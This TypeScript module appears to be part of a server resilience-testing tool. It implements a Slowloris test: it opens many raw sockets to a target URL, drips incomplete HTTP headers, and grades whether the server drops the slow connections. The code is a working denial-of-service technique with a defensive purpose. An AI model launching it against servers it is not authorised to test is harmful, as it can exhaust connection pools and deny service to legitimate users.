import * as net from 'net';
import * as tls from 'tls';
import { URL } from 'url';

export interface SlowlorisConfig {
    url: string;
    method: 'GET' | 'POST' | 'PUT' | 'PATCH' | 'DELETE';
    // Optional tuning parameters
    socketsToOpen?: number;
    testDurationMs?: number;
    dripIntervalMs?: number;
}

export interface SlowlorisResult {
    verdict: 'PASS' | 'FAIL' | 'WARN';
    title: string;
    description: string;
    meta: {
        totalSockets: number;
        socketsSurvived: number;
        socketsKilledByServer: number;
        testDurationMs: number;
    };
}

/**
 * Opens a raw socket and slowly drips headers to test if the server drops idle/slow connections.
 */
const fireSlowSocket = (
    targetUrl: URL,
    method: string,
    dripIntervalMs: number,
): Promise<'SURVIVED' | 'KILLED' | 'ERROR'> => {
    return new Promise((resolve) => {
        const isHttps = targetUrl.protocol === 'https:';
        const port = targetUrl.port
            ? parseInt(targetUrl.port, 10)
            : isHttps
              ? 443
              : 80;

        let socket: net.Socket;
        let intervalId: NodeJS.Timeout;

        const cleanup = (result: 'SURVIVED' | 'KILLED' | 'ERROR') => {
            clearInterval(intervalId);
            if (socket && !socket.destroyed) {
                socket.destroy();
            }
            resolve(result);
        };

        const options = {
            host: targetUrl.hostname,
            port: port,
            rejectUnauthorized: false, // Ignore self-signed certs in test environments
        };

        // 1. Open the raw TCP or TLS connection
        socket = isHttps ? tls.connect(options) : net.createConnection(options);

        socket.on('connect', () => {
            // 2. Send the initial incomplete HTTP request
            socket.write(`${method} ${targetUrl.pathname || '/'} HTTP/1.1\r\n`);
            socket.write(`Host: ${targetUrl.hostname}\r\n`);
            socket.write(`User-Agent: Resilience-Engine-Slowloris/1.0\r\n`);
            socket.write(`Accept: */*\r\n`);
            // Notice we DO NOT send the final \r\n\r\n that finishes the headers

            // 3. Drip feed a fake header slowly to keep the socket alive
            let dripCount = 0;
            intervalId = setInterval(() => {
                if (!socket.destroyed) {
                    socket.write(`X-Drip-${dripCount++}: active\r\n`);
                }
            }, dripIntervalMs);
        });

        // If the server explicitly closes the connection, that is a GOOD thing (Defense mechanism works)
        socket.on('end', () => cleanup('KILLED'));
        socket.on('close', () => cleanup('KILLED'));

        // If we fail to connect at all, record it as an error
        socket.on('error', () => cleanup('ERROR'));
    });
};

export const runSlowlorisTest = async (
    config: SlowlorisConfig,
): Promise<SlowlorisResult> => {
    const TOTAL_SOCKETS = config.socketsToOpen ?? 50;
    const TEST_DURATION_MS = config.testDurationMs ?? 15000; // Wait 15 seconds to see if server kills them
    const DRIP_INTERVAL_MS = config.dripIntervalMs ?? 3000; // Drip a byte every 3 seconds

    console.log(
        `🐌 Starting Slowloris Test: Opening ${TOTAL_SOCKETS} slow sockets to ${config.url}...`,
    );

    const targetUrl = new URL(config.url);
    const start = performance.now();

    // 1. Spawn all sockets concurrently
    const socketPromises = Array.from({ length: TOTAL_SOCKETS }).map(() =>
        fireSlowSocket(targetUrl, config.method, DRIP_INTERVAL_MS),
    );

    // 2. Create a timeout mechanism to end the test
    const timeoutPromise = new Promise<void>((resolve) => {
        setTimeout(() => resolve(), TEST_DURATION_MS);
    });

    // 3. Wait for either all sockets to be closed by the server, or the test duration to end
    let aliveSockets = TOTAL_SOCKETS;
    let killedSockets = 0;
    let errorSockets = 0;

    // Track socket lifecycle asynchronously
    socketPromises.forEach((p) => {
        p.then((status) => {
            if (status === 'KILLED') {
                killedSockets++;
                aliveSockets--;
            } else if (status === 'ERROR') {
                errorSockets++;
                aliveSockets--;
            }
        });
    });

    await timeoutPromise; // Let the attack run for the specified duration

    // Cleanup any sockets that are still surviving
    const finalResults = await Promise.all(
        socketPromises.map((p) => Promise.race([p, 'SURVIVED'])),
    );
    const survivingSockets = finalResults.filter(
        (r) => r === 'SURVIVED',
    ).length;

    const durationMs = performance.now() - start;

    console.log(
        `📊 Slowloris Tally: ${survivingSockets} Survived | ${killedSockets} Killed | ${errorSockets} Errors`,
    );

    // 4. Analyze the Verdict
    let verdict: 'PASS' | 'FAIL' | 'WARN' = 'FAIL';
    let title = 'Vulnerable to Slowloris';
    let description = `The server kept ${survivingSockets} malicious idle connections open for the entire test duration (${TEST_DURATION_MS / 1000}s). This can lead to connection pool exhaustion.`;

    if (survivingSockets === 0 && killedSockets > 0) {
        verdict = 'PASS';
        title = 'Connection Timeout Enforced';
        description = `The server correctly identified the slow connections and forcefully closed them before the test ended.`;
    } else if (survivingSockets < TOTAL_SOCKETS && killedSockets > 0) {
        verdict = 'WARN';
        title = 'Partial Mitigation';
        description = `The server killed some slow connections, but allowed ${survivingSockets} to remain open. Consider tightening your server's header/body timeout limits.`;
    } else if (errorSockets === TOTAL_SOCKETS) {
        verdict = 'WARN';
        title = 'Test Failed to Connect';
        description = `Could not establish TCP connections. The server might be down or actively blocking the test IPs.`;
    }

    return {
        verdict,
        title,
        description,
        meta: {
            totalSockets: TOTAL_SOCKETS,
            socketsSurvived: survivingSockets,
            socketsKilledByServer: killedSockets,
            testDurationMs: Number(durationMs.toFixed(2)),
        },
    };
};
